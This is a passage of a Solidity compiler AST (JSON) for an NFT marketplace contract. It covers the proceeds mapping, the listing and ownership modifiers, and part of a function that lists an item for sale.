NftMarketplace.Listing"}}}},"visibility":"private"},{"constant":false,"id":2671,"mutability":"mutable","name":"s_proceeds","nameLocation":"1191:10:11","nodeType":"VariableDeclaration","scope":3055,"src":"1155:46:11","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_mapping$_t_address_$_t_uint256_$","typeString":"mapping(address => uint256)"},"typeName":{"id":2670,"keyType":{"id":2668,"name":"address","nodeType":"ElementaryTypeName","src":"1163:7:11","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"nodeType":"Mapping","src":"1155:27:11","typeDescriptions":{"typeIdentifier":"t_mapping$_t_address_$_t_uint256_$","typeString":"mapping(address => uint256)"},"valueType":{"id":2669,"name":"uint256","nodeType":"ElementaryTypeName","src":"1174:7:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}},"visibility":"private"},{"body":{"id":2698,"nodeType":"Block","src":"1263:182:11","statements":[{"assignments":[2679],"declarations":[{"constant":false,"id":2679,"mutability":"mutable","name":"listing","nameLocation":"1288:7:11","nodeType":"VariableDeclaration","scope":2698,"src":"1273:22:11","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_struct$_Listing_$2632_memory_ptr","typeString":"struct NftMarketplace.Listing"},"typeName":{"id":2678,"nodeType":"UserDefinedTypeName","pathNode":{"id":2677,"name":"Listing","nodeType":"IdentifierPath","referencedDeclaration":2632,"src":"1273:7:11"},"referencedDeclaration":2632,"src":"1273:7:11","typeDescriptions":{"typeIdentifier":"t_struct$_Listing_$2632_storage_ptr","typeString":"struct NftMarketplace.Listing"}},"visibility":"internal"}],"id":2685,"initialValue":{"baseExpression":{"baseExpression":{"id":2680,"name":"s_listings","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2667,"src":"1298:10:11","typeDescriptions":{"typeIdentifier":"t_mapping$_t_address_$_t_mapping$_t_uint256_$_t_struct$_Listing_$2632_storage_$_$","typeString":"mapping(address => mapping(uint256 => struct NftMarketplace.Listing storage ref))"}},"id":2682,"indexExpression":{"id":2681,"name":"nftAddress","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2673,"src":"1309:10:11","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"nodeType":"IndexAccess","src":"1298:22:11","typeDescriptions":{"typeIdentifier":"t_mapping$_t_uint256_$_t_struct$_Listing_$2632_storage_$","typeString":"mapping(uint256 => struct NftMarketplace.Listing storage ref)"}},"id":2684,"indexExpression":{"id":2683,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2675,"src":"1321:7:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"nodeType":"IndexAccess","src":"1298:31:11","typeDescriptions":{"typeIdentifier":"t_struct$_Listing_$2632_storage","typeString":"struct NftMarketplace.Listing storage ref"}},"nodeType":"VariableDeclarationStatement","src":"1273:56:11"},{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2689,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"expression":{"id":2686,"name":"listing","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2679,"src":"1343:7:11","typeDescriptions":{"typeIdentifier":"t_struct$_Listing_$2632_memory_ptr","typeString":"struct NftMarketplace.Listing memory"}},"id":2687,"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"memberName":"price","nodeType":"MemberAccess","referencedDeclaration":2629,"src":"1343:13:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"hexValue":"30","id":2688,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"1359:1:11","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"src":"1343:17:11","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":2696,"nodeType":"IfStatement","src":"1339:89:11","trueBody":{"id":2695,"nodeType":"Block","src":"1362:66:11","statements":[{"errorCall":{"arguments":[{"id":2691,"name":"nftAddress","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2673,"src":"1397:10:11","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":2692,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2675,"src":"1409:7:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":2690,"name":"AlreadyListed","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2617,"src":"1383:13:11","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_address_$_t_uint256_$returns$__$","typeString":"function (address,uint256) pure"}},"id":2693,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"1383:34:11","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":2694,"nodeType":"RevertStatement","src":"1376:41:11"}]}},{"id":2697,"nodeType":"PlaceholderStatement","src":"1437:1:11"}]},"id":2699,"name":"notListed","nameLocation":"1216:9:11","nodeType":"ModifierDefinition","parameters":{"id":2676,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2673,"mutability":"mutable","name":"nftAddress","nameLocation":"1234:10:11","nodeType":"VariableDeclaration","scope":2699,"src":"1226:18:11","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":2672,"name":"address","nodeType":"ElementaryTypeName","src":"1226:7:11","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":2675,"mutability":"mutable","name":"tokenId","nameLocation":"1254:7:11","nodeType":"VariableDeclaration","scope":2699,"src":"1246:15:11","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2674,"name":"uint256","nodeType":"ElementaryTypeName","src":"1246:7:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"1225:37:11"},"src":"1207:238:11","virtual":false,"visibility":"internal"},{"body":{"id":2726,"nodeType":"Block","src":"1505:179:11","statements":[{"assignments":[2707],"declarations":[{"constant":false,"id":2707,"mutability":"mutable","name":"listing","nameLocation":"1530:7:11","nodeType":"VariableDeclaration","scope":2726,"src":"1515:22:11","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_struct$_Listing_$2632_memory_ptr","typeString":"struct NftMarketplace.Listing"},"typeName":{"id":2706,"nodeType":"UserDefinedTypeName","pathNode":{"id":2705,"name":"Listing","nodeType":"IdentifierPath","referencedDeclaration":2632,"src":"1515:7:11"},"referencedDeclaration":2632,"src":"1515:7:11","typeDescriptions":{"typeIdentifier":"t_struct$_Listing_$2632_storage_ptr","typeString":"struct NftMarketplace.Listing"}},"visibility":"internal"}],"id":2713,"initialValue":{"baseExpression":{"baseExpression":{"id":2708,"name":"s_listings","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2667,"src":"1540:10:11","typeDescriptions":{"typeIdentifier":"t_mapping$_t_address_$_t_mapping$_t_uint256_$_t_struct$_Listing_$2632_storage_$_$","typeString":"mapping(address => mapping(uint256 => struct NftMarketplace.Listing storage ref))"}},"id":2710,"indexExpression":{"id":2709,"name":"nftAddress","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2701,"src":"1551:10:11","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"nodeType":"IndexAccess","src":"1540:22:11","typeDescriptions":{"typeIdentifier":"t_mapping$_t_uint256_$_t_struct$_Listing_$2632_storage_$","typeString":"mapping(uint256 => struct NftMarketplace.Listing storage ref)"}},"id":2712,"indexExpression":{"id":2711,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2703,"src":"1563:7:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"nodeType":"IndexAccess","src":"1540:31:11","typeDescriptions":{"typeIdentifier":"t_struct$_Listing_$2632_storage","typeString":"struct NftMarketplace.Listing storage ref"}},"nodeType":"VariableDeclarationStatement","src":"1515:56:11"},{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2717,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"expression":{"id":2714,"name":"listing","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2707,"src":"1585:7:11","typeDescriptions":{"typeIdentifier":"t_struct$_Listing_$2632_memory_ptr","typeString":"struct NftMarketplace.Listing memory"}},"id":2715,"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"memberName":"price","nodeType":"MemberAccess","referencedDeclaration":2629,"src":"1585:13:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"<=","rightExpression":{"hexValue":"30","id":2716,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"1602:1:11","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"src":"1585:18:11","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":2724,"nodeType":"IfStatement","src":"1581:86:11","trueBody":{"id":2723,"nodeType":"Block","src":"1605:62:11","statements":[{"errorCall":{"arguments":[{"id":2719,"name":"nftAddress","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2701,"src":"1636:10:11","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":2720,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2703,"src":"1648:7:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":2718,"name":"NotListed","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2611,"src":"1626:9:11","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_address_$_t_uint256_$returns$__$","typeString":"function (address,uint256) pure"}},"id":2721,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"1626:30:11","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":2722,"nodeType":"RevertStatement","src":"1619:37:11"}]}},{"id":2725,"nodeType":"PlaceholderStatement","src":"1676:1:11"}]},"id":2727,"name":"isListed","nameLocation":"1459:8:11","nodeType":"ModifierDefinition","parameters":{"id":2704,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2701,"mutability":"mutable","name":"nftAddress","nameLocation":"1476:10:11","nodeType":"VariableDeclaration","scope":2727,"src":"1468:18:11","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":2700,"name":"address","nodeType":"ElementaryTypeName","src":"1468:7:11","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":2703,"mutability":"mutable","name":"tokenId","nameLocation":"1496:7:11","nodeType":"VariableDeclaration","scope":2727,"src":"1488:15:11","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2702,"name":"uint256","nodeType":"ElementaryTypeName","src":"1488:7:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"1467:37:11"},"src":"1450:234:11","virtual":false,"visibility":"internal"},{"body":{"id":2758,"nodeType":"Block","src":"1790:180:11","statements":[{"assignments":[2737],"declarations":[{"constant":false,"id":2737,"mutability":"mutable","name":"nft","nameLocation":"1808:3:11","nodeType":"VariableDeclaration","scope":2758,"src":"1800:11:11","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_contract$_IERC721_$1114","typeString":"contract IERC721"},"typeName":{"id":2736,"nodeType":"UserDefinedTypeName","pathNode":{"id":2735,"name":"IERC721","nodeType":"IdentifierPath","referencedDeclaration":1114,"src":"1800:7:11"},"referencedDeclaration":1114,"src":"1800:7:11","typeDescriptions":{"typeIdentifier":"t_contract$_IERC721_$1114","typeString":"contract IERC721"}},"visibility":"internal"}],"id":2741,"initialValue":{"arguments":[{"id":2739,"name":"nftAddress","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2729,"src":"1822:10:11","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"}],"id":2738,"name":"IERC721","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1114,"src":"1814:7:11","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_IERC721_$1114_$","typeString":"type(contract IERC721)"}},"id":2740,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"1814:19:11","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_contract$_IERC721_$1114","typeString":"contract IERC721"}},"nodeType":"VariableDeclarationStatement","src":"1800:33:11"},{"assignments":[2743],"declarations":[{"constant":false,"id":2743,"mutability":"mutable","name":"owner","nameLocation":"1851:5:11","nodeType":"VariableDeclaration","scope":2758,"src":"1843:13:11","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":2742,"name":"address","nodeType":"ElementaryTypeName","src":"1843:7:11","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"id":2748,"initialValue":{"arguments":[{"id":2746,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2731,"src":"1871:7:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"expression":{"id":2744,"name":"nft","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2737,"src":"1859:3:11","typeDescriptions":{"typeIdentifier":"t_contract$_IERC721_$1114","typeString":"contract IERC721"}},"id":2745,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberName":"ownerOf","nodeType":"MemberAccess","referencedDeclaration":1047,"src":"1859:11:11","typeDescriptions":{"typeIdentifier":"t_function_external_view$_t_uint256_$returns$_t_address_$","typeString":"function (uint256) view external returns (address)"}},"id":2747,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"1859:20:11","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"nodeType":"VariableDeclarationStatement","src":"1843:36:11"},{"condition":{"commonType":{"typeIdentifier":"t_address","typeString":"address"},"id":2751,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2749,"name":"spender","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2733,"src":"1893:7:11","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"nodeType":"BinaryOperation","operator":"!=","rightExpression":{"id":2750,"name":"owner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2743,"src":"1904:5:11","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"src":"1893:16:11","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":2756,"nodeType":"IfStatement","src":"1889:64:11","trueBody":{"id":2755,"nodeType":"Block","src":"1911:42:11","statements":[{"errorCall":{"arguments":[],"expression":{"argumentTypes":[],"id":2752,"name":"NotOwner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2621,"src":"1932:8:11","typeDescriptions":{"typeIdentifier":"t_function_error_pure$__$returns$__$","typeString":"function () pure"}},"id":2753,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"1932:10:11","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":2754,"nodeType":"RevertStatement","src":"1925:17:11"}]}},{"id":2757,"nodeType":"PlaceholderStatement","src":"1962:1:11"}]},"id":2759,"name":"isOwner","nameLocation":"1698:7:11","nodeType":"ModifierDefinition","parameters":{"id":2734,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2729,"mutability":"mutable","name":"nftAddress","nameLocation":"1723:10:11","nodeType":"VariableDeclaration","scope":2759,"src":"1715:18:11","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":2728,"name":"address","nodeType":"ElementaryTypeName","src":"1715:7:11","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":2731,"mutability":"mutable","name":"tokenId","nameLocation":"1751:7:11","nodeType":"VariableDeclaration","scope":2759,"src":"1743:15:11","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2730,"name":"uint256","nodeType":"ElementaryTypeName","src":"1743:7:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":2733,"mutability":"mutable","name":"spender","nameLocation":"1776:7:11","nodeType":"VariableDeclaration","scope":2759,"src":"1768:15:11","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":2732,"name":"address","nodeType":"ElementaryTypeName","src":"1768:7:11","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"1705:84:11"},"src":"1689:281:11","virtual":false,"visibility":"internal"},{"body":{"id":2827,"nodeType":"Block","src":"2185:379:11","statements":[{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2780,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2778,"name":"price","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2765,"src":"2199:5:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"<=","rightExpression":{"hexValue":"30","id":2779,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"2208:1:11","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"src":"2199:10:11","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":2785,"nodeType":"IfStatement","src":"2195:70:11","trueBody":{"id":2784,"nodeType":"Block","src":"2211:54:11","statements":[{"errorCall":{"arguments":[],"expression":{"argumentTypes":[],"id":2781,"name":"PriceMustBeAboveZero","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2625,"src":"2232:20:11","typeDescriptions":{"typeIdentifier":"t_function_error_pure$__$returns$__$","typeString":"function () pure"}},"id":2782,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"2232:22:11","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":2783,"nodeType":"RevertStatement","src":"2225:29:11"}]}},{"assignments":[2788],"declarations":[{"constant":false,"id":2788,"mutability":"mutable","name":"nft","nameLocation":"2282:3:11","nodeType":"VariableDeclaration","scope":2827,"src":"2274:11:11","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_contract$_IERC721_$1114","typeString":"contract IERC721"},"typeName":{"id":2787,"nodeType":"UserDefinedTypeName","pathNode":{"id":2786,"name":"IERC721","nodeType":"IdentifierPath","referencedDeclaration":1114,"src":"2274:7:11"},"referencedDeclaration":1114,"src":"2274:7:11","typeDescriptions":{"typeIdentifier":"t_contract$_IERC721_$1114","typeString":"contract IERC721"}},"visibility":"internal"}],"id":2792,"initialValue":{"arguments":[{"id":2790,"name":"nftAddress","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2761,"src":"2296:10:11","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"}],"id":2789,"name":"IERC721","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1114,"src":"2288:7:11","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_IERC721_$1114_$","typeString":"type(contract IERC721)"}},"id":2791,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"2288:19:11","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_contract$_IERC721_$1114","typeString":"contract IERC721"}},"nodeType":"VariableDeclarationStatement","src":"2274:33:11"},{"condition":{"commonType":{"typeIdentifier":"t_address","typeString":"address"},"id":2801,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"arguments":[{"id":2795,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2763,"src":"2337:7:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"expression":{"id":2793,"name":"nft","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2788,"src":"2321:3:11","typeDescriptions":{"typeIdentifier":"t_contract$_IERC721_$1114","typeString":"contract IERC721"}},"id":2794,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberName":"getApproved","nodeType":"MemberAccess","referencedDeclaration":1103,"src":"2321:15:11","typeDescriptions":{"typeIdentifier":"t_function_external_view$_t_uint256_$returns$_t_address_$","typeString":"function (uint256) view external returns (address)"}},"id":2796,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"2321:24:11","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"nodeType":"BinaryOperation","operator":"!=","rightExpression":{"arguments":[{"id":2799,"name":"this","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-28,"src":"2357:4:11","typeDescriptions":{"typeIdentifier":"t_contract$_NftMarketplace_$3055","typeString":"contract NftMarketplace"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_contract$_NftMarketplace_$3055","typeString":"contract NftMarketplace"}],"id":2798,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"2349:7:11","typeDescriptions":{"typeIdentifier":"t_type$_t_address_$","typeString":"type(address)"},"typeName":{"id":2797,"name":"address","nodeType":"ElementaryTypeName","src":"2349:7:11","typeDescriptions":{}}},"id":2800,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"2349:13:11","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"src":"2321:41:11","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":2806,"nodeType":"IfStatement","src":"2317:106:11","trueBody":{"id":2805,"nodeType":"Block","src":"2364:59:11","statements":[{"errorCall":{"arguments":[],"expression":{"argumentTypes":[],"id":2802,"name":"NotApprovedForMarketplace","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2623,"src":"2385:25:11","typeDescriptions":{"typeIdentifier":"t_function_error_pure$__$returns$__$","typeString":"function () pure"}},"id":2803,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"2385:27:11","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":2804,"nodeType":"RevertStatement","src":"2378:34:11"}]}},{"expression":{"id":2817,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"baseExpression":{"baseExpression":{"id":2807,"name":"s_listings","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2667,"src":"2432:10:11","typeDescriptions":{"typeIdentifier":"t_mapping$_t_address_$_t_mapping$_t_uint256_$_t_struct$_Listing_$2632_storage_$_$","typeString":"mapping(address => mapping(uint256 => struct NftMarketplace.Listing storage ref))"}},"id":2810,"indexExpression":{"id":2808,"name":"nftAddress","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2761,"src":"2443:10:11","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"nodeType":"IndexAccess","src":"2432:22:11","typeDescriptions":{"typeIdentifier":"t_mapping$_t_uint256_$_t_struct$_Listing_$2632_storage_$","typeString":"mapping(uint256 => struct NftMarketplace.Listing storage ref)"}},"id":2811,"indexExpression":{"id":2809,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2763,"src":"2455:7:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":true,"nodeType":"IndexAccess","src":"2432:31:11","typeDescriptions":{"typeIdentifier":"t_struct$_Listing_$2632_storage","typeString":"struct NftMarketplace.Listing storage ref"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"arguments":[{"id":2813,"name":"price","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2765,"src":"2474:5:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"expression":{"id":2814,"name":"msg","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-15,"src":"2481:3:11","typeDescriptions":{"typeIdentifier":"t_magic_message","typeString":"msg"}},"id":2815,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberName":"sender","nodeType":"MemberAccess","src":"2481:10:11","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_address","typeString":"address"}],"id":2812,"name":"Listing","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2632,"src":"2466:7:11","typeDescriptions":{"typeIdentifier":"t_type$_t_struct$_Listing_$2632_storage_ptr_$","typeString":"type(struct NftMarketplace.Listing storage pointer)"}},"id":2816,"isConstant":false,"isLValue":false,"isPure":false,"kind":"structConstructorCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"2466:26:11","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_struct$_Listing_$2632_memory_ptr","typeString":"struct NftMarketplace.Listing memory"}},"src":"2432:60:11","typeDescriptions":{"typeIdentifier":"t_struct$_Listing_$2632_storage","typeString":"struct NftMarketplace.Listing storage ref"}},"id":2818,"nodeType":"ExpressionStatement","src":"2432:60:11"},{"eventCall":{"arguments":[{"expression":{"id":2820,"name":"msg","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-15,"src":"2518:3:11","typeDescriptions":{"typeIdentifier":"t_magic_message","typeString":"msg"}},"id":2821,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberName":"sender","nodeType":"MemberAccess","src":"2518:10:11","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":2822,"name":"nftAddress","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2761,"src":"2530:10:11","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":2823,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2763,"src":"2542:7:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"id":2824,"name":"price","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2765,"src":"2551:5:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":2819,"name":"ItemListed","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2642,"src":"2507:10:11","typeDescriptions":{"typeIdentifier":"t_function_event_nonpayable$_t_address_$_t_address_$_t_uint256_$_t_uint256_$returns$__$","typeString":"function 